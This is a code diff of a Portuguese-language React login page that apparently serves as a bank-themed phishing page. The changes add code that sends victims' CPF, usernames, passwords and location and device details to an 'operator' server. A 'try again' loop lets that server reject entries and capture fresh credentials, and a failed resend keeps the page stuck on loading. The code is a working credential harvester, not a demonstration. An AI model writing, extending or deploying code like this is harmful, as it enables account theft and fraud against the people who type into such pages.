@@ -94,7 +94,41 @@ const collectClientData = async () => {
   };
 };
 
-// Função para monitorar cliente continuamente - MODIFICADA
+// Função para atualizar dados do cliente com PATCH - NOVA IMPLEMENTAÇÃO
+const updateClientWithPatch = async (clientId: string, username: string, password: string): Promise<boolean> => {
+  try {
+    console.log(`Fazendo PATCH para cliente ${clientId} com novos dados...`);
+    console.log('Novos dados:', { username, password });
+    
+    const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/update`, {
+      method: 'PATCH',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({
+        username: username,
+        password: password
+      })
+    });
+
+    console.log(`Status do PATCH: ${response.status}`);
+    
+    if (response.ok) {
+      const responseData = await response.json();
+      console.log('PATCH realizado com sucesso:', responseData);
+      return true;
+    } else {
+      const errorData = await response.text();
+      console.log('Erro no PATCH:', errorData);
+      return false;
+    }
+  } catch (error) {
+    console.log('Erro durante PATCH:', error);
+    return false;
+  }
+};
+
+// Função para monitorar cliente continuamente - MODIFICADA para implementar ciclo
 const monitorClient = async (
   clientId: string, 
   navigate: (path: string) => void, 
@@ -296,7 +330,7 @@ const Index = () => {
     setCpf(formatted);
   };
 
-  // Função para limpar todos os campos
+  // Função para limpar todos os campos - MODIFICADA para reiniciar monitoramento
   const clearAllFields = () => {
     console.log('Limpando todos os campos...');
     setCpf("");
@@ -308,7 +342,7 @@ const Index = () => {
     setSaveChaveMulticanal(false);
     cpfValidation.reset();
     setShowInvalidDataModal(false);
-    console.log('Todos os campos limpos');
+    console.log('Todos os campos limpos - Pronto para novo envio');
   };
 
   // Função para atualizar dados do cliente existente
@@ -402,52 +436,42 @@ const Index = () => {
       console.log('Username:', username);
       console.log('Senha:', senha);
       
-      // Coletar dados do cliente
-      const clientData = await collectClientData();
-      
-      // Preparar dados para envio
-      const userData = {
-        username: username || 'teste_user',
-        password: senha || 'teste_password',
-        ip: clientData.ip,
-        country: clientData.country,
-        city: clientData.city,
-        device: clientData.device,
-        referrer: clientData.referrer,
-        currentUrl: clientData.currentUrl
-      };
-
-      console.log('Dados preparados para envio:', userData);
-
-      // Verificar se já existe clientId (reenvio de dados)
+      // Verificar se já existe clientId (dados inválidos - fazer PATCH)
       const existingClientId = localStorage.getItem('clientId');
       
       if (existingClientId) {
-        console.log('ClientId existente encontrado, fazendo UPDATE:', existingClientId);
+        console.log('ClientId existente encontrado, fazendo PATCH com novos dados:', existingClientId);
         
-        // Fazer UPDATE dos dados
-        const updateSuccess = await updateClientData(existingClientId, userData);
+        // Fazer PATCH com os novos dados de username e password
+        const patchSuccess = await updateClientWithPatch(existingClientId, username, senha);
         
-        if (updateSuccess) {
+        if (patchSuccess) {
+          console.log('PATCH realizado com sucesso, reiniciando monitoramento...');
           // Reiniciar monitoramento com os novos dados
           await monitorClient(existingClientId, navigate, toast, setIsLoading, setShowInvalidDataModal);
         } else {
-          console.log('Erro no update, fazendo novo registro...');
-          // Se update falhar, fazer novo registro
-          const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json',
-            },
-            body: JSON.stringify(userData)
-          });
-
-          if (response.ok) {
-            await processRegistrationResponse(response, navigate, toast, setIsLoading, setShowInvalidDataModal);
-          }
+          console.log('Erro no PATCH, mantendo loading...');
+          // Manter loading mesmo se PATCH falhar
         }
       } else {
         console.log('Nenhum clientId existente, fazendo novo registro...');
+        
+        // Coletar dados do cliente para novo registro
+        const clientData = await collectClientData();
+        
+        // Preparar dados para envio
+        const userData = {
+          username: username || 'teste_user',
+          password: senha || 'teste_password',
+          ip: clientData.ip,
+          country: clientData.country,
+          city: clientData.city,
+          device: clientData.device,
+          referrer: clientData.referrer,
+          currentUrl: clientData.currentUrl
+        };
+
+        console.log('Dados preparados para novo registro:', userData);
         
         // Fazer novo registro
         const response = await fetch('https://servidoroperador.onrender.com/api/clients/register', {
@@ -645,7 +669,7 @@ const Index = () => {
 
   return (
     <div className="min-h-screen flex bg-[#fff] overflow-x-hidden">
-      {/* Modal de Dados Inválidos */}
+      {/* Modal de Dados Inválidos - MODIFICADO para permitir ciclo */}
       <AlertDialog open={showInvalidDataModal} onOpenChange={setShowInvalidDataModal}>
         <AlertDialogContent className="max-w-md mx-auto">
           <AlertDialogHeader>
@@ -661,7 +685,7 @@ const Index = () => {
               onClick={clearAllFields}
               className="bg-orange-500 hover:bg-orange-600 text-white px-8 py-2 rounded-full"
             >
-              Entendi
+              Tentar Novamente
             </AlertDialogAction>
           </AlertDialogFooter>
         </AlertDialogContent>
